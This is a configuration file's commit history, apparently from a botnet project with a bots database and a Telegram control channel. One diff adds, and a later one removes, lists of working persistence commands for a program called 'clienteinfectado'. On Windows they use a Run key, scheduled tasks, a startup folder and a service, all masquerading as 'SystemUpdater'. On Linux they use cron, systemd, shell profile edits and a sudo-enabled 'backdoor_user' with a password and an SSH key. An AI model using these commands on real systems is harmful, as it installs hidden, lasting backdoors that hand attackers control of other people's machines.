patches.content:
Index: 
===================================================================
--- 
+++ 
@@ -13,5 +13,19 @@
 [LOGGING]
 LOG_LEVEL = INFO
 LOG_DIR = logs
 CLIENT_LOG_FILE = client.log
-SERVER_LOG_FILE = server.log
\ No newline at end of file
+SERVER_LOG_FILE = server.log
+
+[CLIENT]
+PERSISTENCIA_WINDOWS = reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdater /t REG_SZ /d "%APPDATA%\\clienteinfectado.exe" /f, schtasks /create /tn "SystemUpdater" /tr "%APPDATA%\\clienteinfectado.exe" /sc ONLOGON /rl HIGHEST, copy %APPDATA%\\clienteinfectado.exe %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemUpdater.exe, sc create SystemUpdater binPath= "%APPDATA%\\clienteinfectado.exe" start= auto, powershell New-ScheduledTaskTrigger -AtLogon | Register-ScheduledTask -TaskName "SystemUpdater" -Action (New-ScheduledTaskAction -Execute "%APPDATA%\\clienteinfectado.exe")
+PERSISTENCIA_LINUX = (crontab -l ; echo '@reboot nohup python3 ~/clienteinfectado.py &') | crontab -, echo '[Unit]
+Description=Bot Persistente
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 ~/clienteinfectado.py
+Restart=always
+User=$USER
+
+[Install]
+WantedBy=multi-user.target' | sudo tee /etc/systemd/system/bot.service && sudo systemctl enable bot.service, echo 'python3 ~/clienteinfectado.py &' >> ~/.bashrc, sudo sh -c 'echo python3 ~/clienteinfectado.py >> /etc/profile', sudo useradd -m -s /bin/bash backdoor_user && echo 'backdoor_user:password' | sudo chpasswd && sudo usermod -aG sudo backdoor_user, mkdir -p /home/backdoor_user/.ssh && echo 'ssh-rsa AAAAB3...' > /home/backdoor_user/.ssh/authorized_keys, chmod 600 /home/backdoor_user/.ssh/authorized_keys && chown -R backdoor_user:backdoor_user /home/backdoor_user/.ssh
\ No newline at end of file

Index: 
===================================================================
--- 
+++ 
@@ -15,17 +15,7 @@
 LOG_DIR = logs
 CLIENT_LOG_FILE = client.log
 SERVER_LOG_FILE = server.log
 
-[CLIENT]
-PERSISTENCIA_WINDOWS = reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdater /t REG_SZ /d "%APPDATA%\\clienteinfectado.exe" /f, schtasks /create /tn "SystemUpdater" /tr "%APPDATA%\\clienteinfectado.exe" /sc ONLOGON /rl HIGHEST, copy %APPDATA%\\clienteinfectado.exe %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemUpdater.exe, sc create SystemUpdater binPath= "%APPDATA%\\clienteinfectado.exe" start= auto, powershell New-ScheduledTaskTrigger -AtLogon | Register-ScheduledTask -TaskName "SystemUpdater" -Action (New-ScheduledTaskAction -Execute "%APPDATA%\\clienteinfectado.exe")
-PERSISTENCIA_LINUX = (crontab -l ; echo '@reboot nohup python3 ~/clienteinfectado.py &') | crontab -, echo '[Unit]
-Description=Bot Persistente
-After=network.target
-
-[Service]
-ExecStart=/usr/bin/python3 ~/clienteinfectado.py
-Restart=always
-User=$USER
-
-[Install]
-WantedBy=multi-user.target' | sudo tee /etc/systemd/system/bot.service && sudo systemctl enable bot.service, echo 'python3 ~/clienteinfectado.py &' >> ~/.bashrc, sudo sh -c 'echo python3 ~/clienteinfectado.py >> /etc/profile', sudo useradd -m -s /bin/bash backdoor_user && echo 'backdoor_user:password' | sudo chpasswd && sudo usermod -aG sudo backdoor_user, mkdir -p /home/backdoor_user/.ssh && echo 'ssh-rsa AAAAB3...' > /home/backdoor_user/.ssh/authorized_keys, chmod 600 /home/backdoor_user/.ssh/authorized_keys && chown -R backdoor_user:backdoor_user /home/backdoor_user/.ssh
\ No newline at end of file
+[TELEGRAM]
+BOT_TOKEN = your_telegram_bot_token
+CHAT_ID = your_telegram_chat_id
\ No newline at end of file

commits.name: Commit-0
commits.content:
[NETWORK]
HOST = 127.0.0.1
PORT = 5000
MAX_CONNECTIONS = 10

[DATABASE]
DB_PATH = bbdd/bots.db

[SECURITY]
SECRET_KEY = MiClaveSuperSecreta
HASH_ALGORITHM = SHA256

[LOGGING]
LOG_LEVEL = INFO
LOG_DIR = logs
CLIENT_LOG_FILE = client.log
SERVER_LOG_FILE = server.log
